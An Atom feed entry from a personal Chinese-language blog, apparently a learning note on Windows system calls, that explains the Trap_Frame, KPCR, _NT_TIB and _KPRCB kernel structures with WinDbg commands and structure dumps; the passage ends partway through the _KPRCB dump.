<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xia0ji233&#39;s blog</title>
  
  <subtitle>学习应该像呼吸一样自然</subtitle>
  <link href="https://xia0ji233.github.io/atom.xml" rel="self"/>
  
  <link href="https://xia0ji233.github.io/"/>
  <updated>2025-01-22T03:21:07.481Z</updated>
  <id>https://xia0ji233.github.io/</id>
  
  <author>
    <name>xia0ji233</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>windows系统调用学习——调用相关结构体学习</title>
    <link href="https://xia0ji233.github.io/2025/01/22/WindowsSyscall2/"/>
    <id>https://xia0ji233.github.io/2025/01/22/WindowsSyscall2/</id>
    <published>2025-01-22T02:00:00.000Z</published>
    <updated>2025-01-22T03:21:07.481Z</updated>
    
    <content type="html"><![CDATA[<p>来深入挖掘一下Windows系统调用的过程</p><span id="more"></span><h2 id="相关结构体介绍"><a href="#相关结构体介绍" class="headerlink" title="相关结构体介绍"></a>相关结构体介绍</h2><h3 id="Trap-Frame"><a href="#Trap-Frame" class="headerlink" title="Trap_Frame"></a>Trap_Frame</h3><p>首先第一个要讲的是 Trap_Frame 结构，如下图所示。</p><img src="/2025/01/22/WindowsSyscall2/1.png" class=""><p>栈帧结构体，用于 <code>Windows API</code> 保存现场。经过提权进入0环的时候，<code>Windows</code>就会遵守这个结构体保存一系列的数据，最后四个成员用于虚拟8086模式下，不属于保护模式的范畴。</p><p>中断发生时，若发生权限变换，则要保存旧堆栈，<code>CPU</code>压入的，由 <code>HardwareEsp</code> 和 <code>HardwareSegSs</code> 两个成员保存。</p><p>中断发生时，保存被中断的代码段和<code>iret</code>要返回的地址，<code>CPU</code>压入的，由 <code>Eip</code>，<code>SegCs</code> 和 <code>EFlags</code> 三个成员保存。</p><p><code>Windows</code> 中<strong>非易失性寄存器</strong>需要在中断例程中先保存，其中<strong>非易失性寄存器</strong>指的是在调用之前和调用之后仍然会保持原值的寄存器。通常来说，调用例程会选择要么不去写这些寄存器，如果一定要写寄存器，则会通过堆栈在调用之前保存该值，调用结束之后重新取回。</p><h3 id="KPCR"><a href="#KPCR" class="headerlink" title="KPCR"></a>KPCR</h3><p><code>kpcr</code>：<code>cpu</code> 核控制块，<code>cpu</code> 一个核一个 <code>kpcr</code> 结构，<code>fs=0x30</code> 在内核中的时候，指向的是 <code>kpcr</code> 结构，<code>fs=0x3b</code> 在应用层的时候，指向的是当前线程的 <code>TEB</code></p><p><code>KPCR</code> 里面还嵌套着两个结构体 <code>TIB</code> 和 <code>KPRCB</code>。</p><p>查看计算机有多少核：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd KeNumberProcessors L1</span><br><span class="line">83daaa2c  00000001</span><br></pre></td></tr></table></figure><p>查看 <code>KPCR</code> 结构体可以通过 <code>KiProcessorBlock</code> 数组得到。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd KiProcessorBlock</span><br><span class="line">83daa980  80b97120 00000000 00000000 00000000</span><br><span class="line">83daa990  00000000 00000000 00000000 00000000</span><br><span class="line">83daa9a0  00000000 00000000 00000000 00000000</span><br><span class="line">83daa9b0  00000000 00000000 00000000 00000000</span><br><span class="line">83daa9c0  00000000 00000000 00000000 00000000</span><br><span class="line">83daa9d0  00000000 00000000 00000000 00000000</span><br><span class="line">83daa9e0  00000000 00000000 00000000 00000000</span><br><span class="line">83daa9f0  00000000 00000000 00000000 00000000</span><br></pre></td></tr></table></figure><p>因为只有一个核，所以看到只存储了一个 <code>KPCR</code> 指针，用 <code>dt</code> 命令查看结构体值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt nt!_KPCR 80b97000</span><br><span class="line">   +0x000 NtTib            : _NT_TIB</span><br><span class="line">   +0x000 Used_ExceptionList : 0xa8d2706c _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +0x004 Used_StackBase   : (null) </span><br><span class="line">   +0x008 Spare2           : (null) </span><br><span class="line">   +0x00c TssCopy          : 0x80b93c00 Void</span><br><span class="line">   +0x010 ContextSwitches  : 0x35bf7</span><br><span class="line">   +0x014 SetMemberCopy    : 1</span><br><span class="line">   +0x018 Used_Self        : 0x7ffda000 Void</span><br><span class="line">   +0x01c SelfPcr          : 0x80b97000 _KPCR</span><br><span class="line">   +0x020 Prcb             : 0x80b97120 _KPRCB</span><br><span class="line">   +0x024 Irql             : 0x1f &#x27;&#x27;</span><br><span class="line">   +0x028 IRR              : 0</span><br><span class="line">   +0x02c IrrActive        : 0</span><br><span class="line">   +0x030 IDR              : 0xffffffff</span><br><span class="line">   +0x034 KdVersionBlock   : 0x83d6f5c0 Void</span><br><span class="line">   +0x038 IDT              : 0x80b93000 _KIDTENTRY</span><br><span class="line">   +0x03c GDT              : 0x80b93800 _KGDTENTRY</span><br><span class="line">   +0x040 TSS              : 0x80b93c00 _KTSS</span><br><span class="line">   +0x044 MajorVersion     : 1</span><br><span class="line">   +0x046 MinorVersion     : 1</span><br><span class="line">   +0x048 SetMember        : 1</span><br><span class="line">   +0x04c StallScaleFactor : 0x973</span><br><span class="line">   +0x050 SpareUnused      : 0 &#x27;&#x27;</span><br><span class="line">   +0x051 Number           : 0 &#x27;&#x27;</span><br><span class="line">   +0x052 Spare0           : 0 &#x27;&#x27;</span><br><span class="line">   +0x053 SecondLevelCacheAssociativity : 0 &#x27;&#x27;</span><br><span class="line">   +0x054 VdmAlert         : 0</span><br><span class="line">   +0x058 KernelReserved   : [14] 0</span><br><span class="line">   +0x090 SecondLevelCacheSize : 0</span><br><span class="line">   +0x094 HalReserved      : [16] 0x1000000</span><br><span class="line">   +0x0d4 InterruptMode    : 0</span><br><span class="line">   +0x0d8 Spare1           : 0 &#x27;&#x27;</span><br><span class="line">   +0x0dc KernelReserved2  : [17] 0</span><br><span class="line">   +0x120 PrcbData         : _KPRCB</span><br></pre></td></tr></table></figure><p>把里面存入的两个结构体 <code>_NT_TIB</code> 和 <code>_KPRCB</code> 介绍一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt nt!_NT_TIB 0xa8d2706c</span><br><span class="line">   +0x000 ExceptionList    : 0xa8d270d4 _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +0x004 StackBase        : 0x83cfe4a2 Void</span><br><span class="line">   +0x008 StackLimit       : 0x5396aa78 Void</span><br><span class="line">   +0x00c SubSystemTib     : (null) </span><br><span class="line">   +0x010 FiberData        : 0xa8d270e4 Void</span><br><span class="line">   +0x010 Version          : 0xa8d270e4</span><br><span class="line">   +0x014 ArbitraryUserPointer : 0x83cf9851 Void</span><br><span class="line">   +0x018 Self             : 0x00000004 _NT_TIB</span><br></pre></td></tr></table></figure><p>其中 <code>_KPRCB</code> 是直接包含而不是用指针引用的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt nt!_KPRCB 0x80b97120</span><br><span class="line">   +0x000 MinorVersion     : 1</span><br><span class="line">   +0x002 MajorVersion     : 1</span><br><span class="line">   +0x004 CurrentThread    : 0x88a20a60 _KTHREAD</span><br><span class="line">   +0x008 NextThread       : (null) </span><br><span class="line">   +0x00c IdleThread       : 0x83d764c0 _KTHREAD</span><br><span class="line">   +0x010 LegacyNumber     : 0 &#x27;&#x27;</span><br><span class="line">   +0x011 NestingLevel     : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x012 BuildType        : 0</span><br><span class="line">   +0x014 CpuType          : 6 &#x27;&#x27;</span><br><span class="line">   +0x015 CpuID            : 1 &#x27;&#x27;</span><br><span class="line">   +0x016 CpuStep          : 0xb701</span><br><span class="line">   +0x016 CpuStepping      : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x017 CpuModel         : 0xb7 &#x27;&#x27;</span><br><span class="line">   +0x018 ProcessorState   : _KPROCESSOR_STATE</span><br><span class="line">   +0x338 KernelReserved   : [16] 0</span><br><span class="line">   +0x378 HalReserved      : [16] 0x969600</span><br><span class="line">   +0x3b8 CFlushSize       : 0x40</span><br><span class="line">   +0x3bc CoresPerPhysicalProcessor : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x3bd LogicalProcessorsPerCore : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x3be PrcbPad0         : [2]  &quot;&quot;</span><br><span class="line">   +0x3c0 MHz              : 0x973</span><br><span class="line">   +0x3c4 CpuVendor        : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x3c5 GroupIndex       : 0 &#x27;&#x27;</span><br><span class="line">   +0x3c6 Group            : 0</span><br><span class="line">   +0x3c8 GroupSetMember   : 1</span><br><span class="line">   +0x3cc Number           : 0</span><br><span class="line">   +0x3d0 PrcbPad1         : [72]  &quot;&quot;</span><br><span class="line">   +0x418 LockQueue        : [17] _KSPIN_LOCK_QUEUE</span><br><span class="line">   +0x4a0 NpxThread        : 0x88a20a60 _KTHREAD</span><br><span class="line">   +0x4a4 InterruptCount   : 0xaf7b</span><br><span class="line">   +0x4a8 KernelTime       : 0x16d2</span><br><span class="line">   +0x4ac UserTime         : 0x385</span><br><span class="line">   +0x4b0 DpcTime          : 0x1fe</span><br><span class="line">   +0x4b4 DpcTimeCount     : 0</span><br><span class="line">   +0x4b8 InterruptTime    : 0x58</span><br><span class="line">   +0x4bc AdjustDpcThreshold : 0x11</span><br><span class="line">   +0x4c0 PageColor        : 0x1356</span><br><span class="line">   +0x4c4 DebuggerSavedIRQL : 0x1c &#x27;&#x27;</span><br><span class="line">   +0x4c5 NodeColor        : 0 &#x27;&#x27;</span><br><span class="line">   +0x4c6 PrcbPad20        : [2]  &quot;&quot;</span><br><span class="line">   +0x4c8 NodeShiftedColor : 0</span><br><span class="line">   +0x4cc ParentNode       : 0x83d76440 _KNODE</span><br><span class="line">   +0x4d0 SecondaryColorMask : 0xff</span><br><span class="line">   +0x4d4 DpcTimeLimit     : 0</span><br><span class="line">   +0x4d8 MsrIa32TsxCtrl   : 0</span><br><span class="line">   +0x4e0 CcFastReadNoWait : 0</span><br><span class="line">   +0x4e4 CcFastReadWait   : 0x1514</span><br><span class="line">   +0x4e8 CcFastReadNotPossible : 0</span><br><span class="line">   +0x4ec CcCopyReadNoWait : 0</span><br><span class="line">   +0x4f0 CcCopyReadWait   : 0x176a</span><br><span class="line">   +0x4f4 CcCopyReadNoWaitMiss : 0</span><br><span class="line">   +0x4f8 MmSpinLockOrdering : 0n0</span><br><span class="line">   +0x4fc IoReadOperationCount : 0n7085</span><br><span class="line">   +0x500 IoWriteOperationCount : 0n1965</span><br><span class="line">   +0x504 IoOtherOperationCount : 0n82423</span><br><span class="line">   +0x508 IoReadTransferCount : _LARGE_INTEGER 0x30316f8</span><br><span class="line">   +0x510 IoWriteTransferCount : _LARGE_INTEGER 0xc7b2db</span><br><span class="line">   +0x518 IoOtherTransferCount : _LARGE_INTEGER 0x308a77</span><br><span class="line">   +0x520 CcFastMdlReadNoWait : 0</span><br><span class="line">   +0x524 CcFastMdlReadWait : 0</span><br><span class="line">   +0x528 CcFastMdlReadNotPossible : 0</span><br><span class="line">   +0x52c CcMapDataNoWait  : 0</span><br><span class="line">   +0x530 CcMapDataWait    : 0x995f</span><br><span class="line">   +0x534 CcPinMappedDataCount : 0x891</span><br><span class="line">   +0x538 CcPinReadNoWait  : 0</span><br><span class="line">   +0x53c CcPinReadWait    : 0x2b1</span><br><span class="line">   +0x540 CcMdlReadNoWait  : 0</span><br><span class="line">   +0x544 CcMdlReadWait    : 1</span><br><span class="line">   +0x548 CcLazyWriteHotSpots : 0xd</span><br><span class="line">   +0x54c CcLazyWriteIos   : 0x88</span><br><span class="line">   +0x550 CcLazyWritePages : 0x375</span><br><span class="line">   +0x554 CcDataFlushes    : 0x18e</span><br><span class="line">   +0x558 CcDataPages      : 0x4ff</span><br><span class="line">   +0x55c CcLostDelayedWrites : 0</span><br><span class="line">   +0x560 CcFastReadResourceMiss : 0</span><br><span class="line">   +0x564 CcCopyReadWaitMiss : 0x371</span><br><span class="line">   +0x568 CcFastMdlReadResourceMiss : 0</span><br><span class="line">   +0x56c CcMapDataNoWaitMiss : 0</span><br><span class="line">   +0x570 CcMapDataWaitMiss : 0x7f0</span><br><span class="line">   +0x574 CcPinReadNoWaitMiss : 0</span><br><span class="line">   +0x578 CcPinReadWaitMiss : 0x16</span><br><span class="line">   +0x57c CcMdlReadNoWaitMiss : 0</span><br><span class="line">   +0x580 CcMdlReadWaitMiss : 0</span><br><span class="line">   +0x584 CcReadAheadIos   : 0x772</span><br><span class="line">   +0x588 KeAlignmentFixupCount : 0</span><br><span class="line">   +0x58c KeExceptionDispatchCount : 0x1d1</span><br><span class="line">   +0x590 KeSystemCalls    : 0x75b693</span><br><span class="line">   +0x594 AvailableTime    : 0x331</span><br><span class="line">   +0x598 PrcbPad22        : [2] 0</span><br><span class="line">   +0x5a0 PPLookasideList  : [16] _PP_LOOKASIDE_LIST</span><br><span class="line">   +0x620 PPNPagedLookasideList : [32] _GENERAL_LOOKASIDE_POOL</span><br><span class="line">   +0xf20 PPPagedLookasideList : [32] _GENERAL_LOOKASIDE_POOL</span><br><span class="line">   +0x1820 PacketBarrier    : 0</span><br><span class="line">   +0x1824 ReverseStall     : 0n4</span><br><span class="line">   +0x1828 IpiFrame         : (null) </span><br><span class="line">   +0x182c PrcbPad3         : [52]  &quot;&quot;</span><br><span class="line">   +0x1860 CurrentPacket    : [3] (null) </span><br><span class="line">   +0x186c TargetSet        : 0</span><br><span class="line">   +0x1870 WorkerRoutine    : (null) </span><br><span class="line">   +0x1874 IpiFrozen        : 0</span><br><span class="line">   +0x1878 PrcbPad4         : [40]  &quot;&quot;</span><br><span class="line">   +0x18a0 RequestSummary   : 0</span><br><span class="line">   +0x18a4 SignalDone       : (null) </span><br><span class="line">   +0x18a8 TrappedSecurityDomain : 0x00000001`0000001d</span><br><span class="line">   +0x18b0 BpbState         : 0x2 &#x27;&#x27;</span><br><span class="line">   +0x18b0 BpbCpuIdle       : 0y0</span><br><span class="line">   +0x18b0 BpbFlushRsbOnTrap : 0y1</span><br><span class="line">   +0x18b0 BpbIbpbOnReturn  : 0y0</span><br><span class="line">   +0x18b0 BpbIbpbOnTrap    : 0y0</span><br><span class="line">   +0x18b0 BpbReserved      : 0y0000</span><br><span class="line">   +0x18b1 BpbFeatures      : 0x2 &#x27;&#x27;</span><br><span class="line">   +0x18b1 BpbClearOnIdle   : 0y0</span><br><span class="line">   +0x18b1 BpbEnabled       : 0y1</span><br><span class="line">   +0x18b1 BpbSmep          : 0y0</span><br><span class="line">   +0x18b1 BpbFeaturesReserved : 0y00000 (0)</span><br><span class="line">   +0x18b2 BpbCurrentSpecCtrl : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x18b3 BpbKernelSpecCtrl : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x18b4 BpbNmiSpecCtrl   : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x18b5 BpbUserSpecCtrl  : 0 &#x27;&#x27;</span><br><span class="line">   +0x18b6 PrcbPad50        : [42]  &quot;&quot;</span><br><span class="line">   +0x18e0 DpcData          : [2] _KDPC_DATA</span><br><span class="line">   +0x1908 DpcStack         : 0x80d90000 Void</span><br><span class="line">   +0x190c MaximumDpcQueueDepth : 0n4</span><br><span class="line">   +0x1910 DpcRequestRate   : 0</span><br><span class="line">   +0x1914 MinimumDpcRate   : 3</span><br><span class="line">   +0x1918 DpcLastCount     : 0x496b</span><br><span class="line">   +0x191c PrcbLock         : 0</span><br><span class="line">   +0x1920 DpcGate          : _KGATE</span><br><span class="line">   +0x1930 ThreadDpcEnable  : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x1931 QuantumEnd       : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x1932 DpcRoutineActive : 0 &#x27;&#x27;</span><br><span class="line">   +0x1933 IdleSchedule     : 0 &#x27;&#x27;</span><br><span class="line">   +0x1934 DpcRequestSummary : 0n8</span><br><span class="line">   +0x1934 DpcRequestSlot   : [2] 0n8</span><br><span class="line">   +0x1934 NormalDpcState   : 0n8</span><br><span class="line">   +0x1936 DpcThreadActive  : 0y0</span><br><span class="line">   +0x1936 ThreadDpcState   : 0n0</span><br><span class="line">   +0x1938 TimerHand        : 0x1a56</span><br><span class="line">   +0x193c LastTick         : 0x1a57</span><br><span class="line">   +0x1940 MasterOffset     : 0n81398</span><br><span class="line">   +0x1944 PrcbPad41        : [2] 0</span><br><span class="line">   +0x194c PeriodicCount    : 0</span><br><span class="line">   +0x1950 PeriodicBias     : 0</span><br><span class="line">   +0x1958 TickOffset       : 0x1236b</span><br><span class="line">   +0x1960 TimerTable       : _KTIMER_TABLE</span><br><span class="line">   +0x31a0 CallDpc          : _KDPC</span><br><span class="line">   +0x31c0 ClockKeepAlive   : 0n1</span><br><span class="line">   +0x31c4 ClockCheckSlot   : 0 &#x27;&#x27;</span><br><span class="line">   +0x31c5 ClockPollCycle   : 0xa8 &#x27;&#x27;</span><br><span class="line">   +0x31c6 PrcbPad6         : [2]  &quot;&quot;</span><br><span class="line">   +0x31c8 DpcWatchdogPeriod : 0n0</span><br><span class="line">   +0x31cc DpcWatchdogCount : 0n0</span><br><span class="line">   +0x31d0 ThreadWatchdogPeriod : 0n0</span><br><span class="line">   +0x31d4 ThreadWatchdogCount : 0n0</span><br><span class="line">   +0x31d8 KeSpinLockOrdering : 0n0</span><br><span class="line">   +0x31dc PrcbPad70        : [1] 0</span><br><span class="line">   +0x31e0 WaitListHead     : _LIST_ENTRY [ 0x87a1cdbc - 0x86928ae4 ]</span><br><span class="line">   +0x31e8 WaitLock         : 0</span><br><span class="line">   +0x31ec ReadySummary     : 0x100</span><br><span class="line">   +0x31f0 QueueIndex       : 1</span><br><span class="line">   +0x31f4 DeferredReadyListHead : _SINGLE_LIST_ENTRY</span><br><span class="line">   +0x31f8 StartCycles      : 0x0000005d`20e43ca2</span><br><span class="line">   +0x3200 CycleTime        : 0x00000020`5b03abb8</span><br><span class="line">   +0x3208 HighCycleTime    : 0x20</span><br><span class="line">   +0x320c PrcbPad71        : 0</span><br><span class="line">   +0x3210 PrcbPad72        : [2] 0</span><br><span class="line">   +0x3220 DispatcherReadyListHead : [32] _LIST_ENTRY [ 0x80b9a340 - 0x80b9a340 ]</span><br><span class="line">   +0x3320 ChainedInterruptList : (null) </span><br><span class="line">   +0x3324 LookasideIrpFloat : 0n2147483647</span><br><span class="line">   +0x3328 MmPageFaultCount : 0n380185</span><br><span class="line">   +0x332c MmCopyOnWriteCount : 0n6594</span><br><span class="line">   +0x3330 MmTransitionCount : 0n139141</span><br><span class="line">   +0x3334 MmCacheTransitionCount : 0n0</span><br><span class="line">   +0x3338 MmDemandZeroCount : 0n227545</span><br><span class="line">   +0x333c MmPageReadCount  : 0n43411</span><br><span class="line">   +0x3340 MmPageReadIoCount : 0n10075</span><br><span class="line">   +0x3344 MmCacheReadCount : 0n0</span><br><span class="line">   +0x3348 MmCacheIoCount   : 0n0</span><br><span class="line">   +0x334c MmDirtyPagesWriteCount : 0n0</span><br><span class="line">   +0x3350 MmDirtyWriteIoCount : 0n0</span><br><span class="line">   +0x3354 MmMappedPagesWriteCount : 0n0</span><br><span class="line">   +0x3358 MmMappedWriteIoCount : 0n0</span><br><span class="line">   +0x335c CachedCommit     : 0xa3</span><br><span class="line">   +0x3360 CachedResidentAvailable : 0xf9</span><br><span class="line">   +0x3364 HyperPte         : 0x80c00004 Void</span><br><span class="line">   +0x3368 PrcbPad8         : [4]  &quot;&quot;</span><br><span class="line">   +0x336c VendorString     : [13]  &quot;GenuineIntel&quot;</span><br><span class="line">   +0x3379 InitialApicId    : 0 &#x27;&#x27;</span><br><span class="line">   +0x337a LogicalProcessorsPerPhysicalProcessor : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x337b PrcbPad9         : [5]  &quot;&quot;</span><br><span class="line">   +0x3380 FeatureBits      : 0x60cd3fff</span><br><span class="line">   +0x3388 UpdateSignature  : _LARGE_INTEGER 0xffffffff`00000000</span><br><span class="line">   +0x3390 IsrTime          : 0</span><br><span class="line">   +0x3398 RuntimeAccumulation : 0x3eb41562</span><br><span class="line">   +0x33a0 PowerState       : _PROCESSOR_POWER_STATE</span><br><span class="line">   +0x3468 DpcWatchdogDpc   : _KDPC</span><br><span class="line">   +0x3488 DpcWatchdogTimer : _KTIMER</span><br><span class="line">   +0x34b0 WheaInfo         : 0x8691c0d0 Void</span><br><span class="line">   +0x34b4 EtwSupport       : 0x868d17d8 Void</span><br><span class="line">   +0x34b8 InterruptObjectPool : _SLIST_HEADER</span><br><span class="line">   +0x34c0 HypercallPageList : _SLIST_HEADER</span><br><span class="line">   +0x34c8 HypercallPageVirtual : 0x80d83000 Void</span><br><span class="line">   +0x34cc VirtualApicAssist : (null) </span><br><span class="line">   +0x34d0 StatisticsPage   : (null) </span><br><span class="line">   +0x34d4 RateControl      : (null) </span><br><span class="line">   +0x34d8 Cache            : [5] _CACHE_DESCRIPTOR</span><br><span class="line">   +0x3514 CacheCount       : 4</span><br><span class="line">   +0x3518 CacheProcessorMask : [5] 1</span><br><span class="line">   +0x352c PackageProcessorSet : _KAFFINITY_EX</span><br><span class="line">   +0x3538 PrcbPad91        : [1] 0</span><br><span class="line">   +0x353c CoreProcessorSet : 1</span><br><span class="line">   +0x3540 TimerExpirationDpc : _KDPC</span><br><span class="line">   +0x3560 SpinLockAcquireCount : 0x3465aa</span><br><span class="line">   +0x3564 SpinLockContentionCount : 0xb</span><br><span class="line">   +0x3568 SpinLockSpinCount : 0</span><br><span class="line">   +0x356c IpiSendRequestBroadcastCount : 0</span><br><span class="line">   +0x3570 IpiSendRequestRoutineCount : 0</span><br><span class="line">   +0x3574 IpiSendSoftwareInterruptCount : 0</span><br><span class="line">   +0x3578 ExInitializeResourceCount : 0x6bbf</span><br><span class="line">   +0x357c ExReInitializeResourceCount : 0x563</span><br><span class="line">   +0x3580 ExDeleteResourceCount : 0x58ac</span><br><span class="line">   +0x3584 ExecutiveResourceAcquiresCount : 0x2c9bf6</span><br><span class="line">   +0x3588 ExecutiveResourceContentionsCount : 0x649</span><br><span class="line">   +0x358c 